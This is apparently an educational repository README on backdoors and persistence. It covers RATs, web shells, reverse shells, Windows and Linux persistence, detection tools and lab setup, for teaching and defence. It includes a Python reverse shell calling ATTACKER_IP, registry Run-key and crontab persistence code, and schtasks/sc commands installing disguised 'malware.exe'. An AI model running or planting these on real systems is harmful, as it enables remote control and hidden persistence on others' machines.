# 🔙 Backdoors - Remote Access & Persistence Mechanisms

<div align="center">

**Educational materials for understanding backdoor techniques and persistence mechanisms**

</div>

---

## 📚 Table of Contents

- [Overview](#overview)
- [What are Backdoors?](#what-are-backdoors)
- [Types of Backdoors](#types-of-backdoors)
- [Persistence Mechanisms](#persistence-mechanisms)
- [Detection & Prevention](#detection--prevention)
- [Educational Examples](#educational-examples)
- [Lab Setup](#lab-setup)
- [Resources](#resources)

---

## Overview

This directory contains educational materials demonstrating various backdoor techniques and persistence mechanisms used in security research. These materials are designed to help you:

- Understand how attackers maintain access to compromised systems
- Learn about different persistence mechanisms
- Develop skills in detecting and removing backdoors
- Improve your defensive security knowledge

---

## What are Backdoors?

A **backdoor** is a method of bypassing normal authentication to gain unauthorized access to a computer system. In security research, understanding backdoors is crucial for:

- **System administration** - Identifying unauthorized access points
- **Incident response** - Detecting and removing persistent threats
- **Security auditing** - Finding hidden access mechanisms
- **Malware analysis** - Understanding attacker techniques

### Common Characteristics

- Hidden from normal users and administrators
- Activated by specific triggers or commands
- Often encrypted or obfuscated
- May include anti-analysis features
- Can provide remote control capabilities

---

## Types of Backdoors

### 1. Remote Access Trojans (RATs)

Programs that provide remote control capabilities:

- **Features:** File management, screen capture, keylogging, webcam access
- **Examples:** Poison Ivy, DarkComet, NanoCore
- **Detection:** Network traffic analysis, behavioral monitoring

### 2. Web Shells

Script-based backdoors accessible via web browsers:

- **Languages:** PHP, ASP, JSP, Python
- **Placement:** Web directories, often with legitimate names
- **Detection:** File integrity monitoring, web application firewalls

### 3. Reverse Shells

Connections initiated from the target machine:

- **Protocol:** TCP, UDP, ICMP, DNS
- **Advantages:** Bypasses inbound firewall rules
- **Detection:** Outbound connection monitoring

### 4. Bind Shells

Listeners on the target waiting for connections:

- **Port selection:** Often uses high or common ports
- **Limitations:** Requires inbound access
- **Detection:** Port scanning, netstat analysis

### 5. Hardware/Firmware Backdoors

Modifications at the hardware or firmware level:

- **Examples:** BIOS/UEFI modifications, firmware implants
- **Difficulty:** Extremely difficult to detect
- **Impact:** Persists across OS reinstalls

---

## Persistence Mechanisms

### Windows Persistence

#### Registry Keys

```plaintext
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

- **Detection:** Monitor registry changes, audit startup locations
- **Prevention:** Limit registry write permissions, use AppLocker

#### Scheduled Tasks

```plaintext
schtasks /create /tn "Maintenance" /tr "malware.exe" /sc onlogon
```

- **Detection:** Review scheduled tasks, monitor task creation
- **Prevention:** Restrict task creation permissions

#### Services

```plaintext
sc create "WindowsUpdate" binPath="malware.exe" start=auto
```

- **Detection:** Service audit, monitor service creation
- **Prevention:** Service hardening, use Windows Service Hardening

#### DLL Hijacking

- **Technique:** Place malicious DLL in application directory
- **Detection:** File integrity monitoring, signed binaries
- **Prevention:** Known DLLs list, DLL search order hardening

#### WMI Event Subscriptions

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
```

- **Detection:** Audit WMI subscriptions, event logging
- **Prevention:** Restrict WMI namespace access

### Linux Persistence

#### Cron Jobs

```bash
* * * * * /home/user/.config/updater.sh
```

- **Detection:** Audit crontabs, monitor cron directories
- **Prevention:** Restrict cron access, use cron.allow/deny

#### Systemd Services

```ini
[Unit]
Description=System Update Service
[Service]
ExecStart=/opt/.hidden/service
[Install]
WantedBy=multi-user.target
```

- **Detection:** Audit systemd units, monitor service creation
- **Prevention:** Service file permissions, SELinux/AppArmor

#### SSH Keys

```bash
# Authorized keys
~/.ssh/authorized_keys
```

- **Detection:** Monitor SSH key changes, audit authorized_keys
- **Prevention:** Key management, regular key rotation

#### Init Scripts

```bash
/etc/init.d/backdoor
/etc/rc.local
```

- **Detection:** File integrity monitoring, init script audit
- **Prevention:** Restrict init script permissions

#### LD_PRELOAD

```bash
export LD_PRELOAD=/usr/lib/libmalware.so
```

- **Detection:** Monitor environment variables, library integrity
- **Prevention:** Secure LD_PRELOAD usage, library signing

---

## Detection & Prevention

### Detection Techniques

#### 1. File Integrity Monitoring

- Monitor critical system files and directories
- Detect unauthorized modifications
- Tools: AIDE, Tripwire, OSSEC

#### 2. Network Monitoring

- Monitor outbound connections
- Detect unusual traffic patterns
- Tools: Wireshark, Suricata, Zeek

#### 3. Process Monitoring

- Monitor process creation and behavior
- Detect suspicious parent-child relationships
- Tools: Sysmon, Process Monitor, auditd

#### 4. Registry/Configuration Monitoring

- Track changes to startup locations
- Monitor service and scheduled task creation
- Tools: Regshot, Auditd

#### 5. Behavioral Analysis

- Detect anomalous behavior patterns
- Machine learning-based detection
- Tools: EDR solutions, SIEM systems

### Prevention Strategies

#### 1. Principle of Least Privilege

- Run services with minimal required permissions
- Use non-administrative accounts when possible
- Implement role-based access control

#### 2. Application Whitelisting

- Allow only authorized applications
- Block unknown executables
- Tools: AppLocker, Windows Defender Application Control

#### 3. Network Segmentation

- Isolate critical systems
- Implement firewall rules
- Use VLANs and network zones

#### 4. Regular Updates

- Keep systems patched
- Update applications regularly
- Monitor security advisories

#### 5. Security Hardening

- Disable unnecessary services
- Remove unused protocols
- Implement security baselines (CIS, NIST)

---

## Educational Examples

### Example 1: Simple Reverse Shell (Python)

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()
```

**Detection:** Outbound connection to unknown IP, Python process with network activity

**Prevention:** Application whitelisting, network egress filtering

### Example 2: Windows Registry Persistence

```python
import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                     r"Software\Microsoft\Windows\CurrentVersion\Run", 
                     0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                 r"C:\Temp\updater.exe")
winreg.CloseKey(key)
```

**Detection:** Registry change monitoring, startup entry analysis

**Prevention:** Registry access restrictions, startup monitoring

### Example 3: Linux Cron Persistence

```bash
# Add to crontab
(crontab -l 2>/dev/null; echo "* * * * * /home/user/.config/update.sh") | crontab -
```

**Detection:** Crontab monitoring, file integrity checking

**Prevention:** Cron access restrictions, regular audits

---

## Lab Setup

### Windows Lab Environment

1. **Create a Windows VM**
   - Windows 10/11 or Server 2019/2022
   - Disable automatic updates during testing
   - Create a snapshot before testing

2. **Install Monitoring Tools**
   - Sysinternals Suite (Process Monitor, Process Explorer)
   - Sysmon for advanced logging
   - Wireshark for network analysis
   - Regshot for registry monitoring

3. **Network Isolation**
   - Use host-only network adapter
   - Disable internet access
   - Use internal network for testing

### Linux Lab Environment

1. **Create a Linux VM**
   - Ubuntu, Kali Linux, or similar
   - Minimal installation preferred
   - Create a snapshot before testing

2. **Install Monitoring Tools**
   - auditd for system auditing
   - strace for process tracing
   - lsof for open file monitoring
   - tcpdump for network capture

3. **Network Configuration**
   - Isolate from production networks
   - Use bridge or host-only networking
   - Configure firewall rules

### Safety Precautions

- **Always use virtual machines**
- **Disable shared folders/clipboard**
- **Never test on production systems**
- **Keep host system updated**
- **Use antivirus on host system**
- **Document all changes**

---

## Resources

### Learning Materials

- **MITRE ATT&CK:** [Persistence Techniques](https://attack.mitre.org/tactics/TA0003/)
- **OWASP:** [Backdoor Detection](https://owasp.org/www-community/controls/Backdoor_Detection)
- **SANS:** [Persistence Mechanisms](https://www.sans.org/white-papers/)

### Tools

- **Detection:**
  - [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
  - [OSSEC](https://www.ossec.net/)
  - [Wazuh](https://wazuh.com/)
  - [Splunk](https://www.splunk.com/)

- **Analysis:**
  - [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
  - [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)
  - [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)

- **Testing:**
  - [Metasploit Framework](https://www.metasploit.com/)
  - [Empire](https://github.com/EmpireProject/Empire)
  - [Covenant](https://github.com/cobbr/Covenant)

### Research Papers

- "A Survey of Backdoor Attacks"
- "Persistence Mechanisms in Modern Malware"
- "Detection of Advanced Persistent Threats"

---

## ⚠️ Important Notes

- All materials in this directory are for **educational purposes only**
- Never use these techniques on systems you don't own or have permission to test
- Unauthorized access to computer systems is illegal
- Always use isolated lab environments for testing
- Refer to the main [DISCLAIMER.md](../DISCLAIMER.md) for full legal information

---

<div align="center">

**🔒 Learn to defend by understanding how attackers persist**

**📧 Questions? Open an issue in the main repository**

</div>
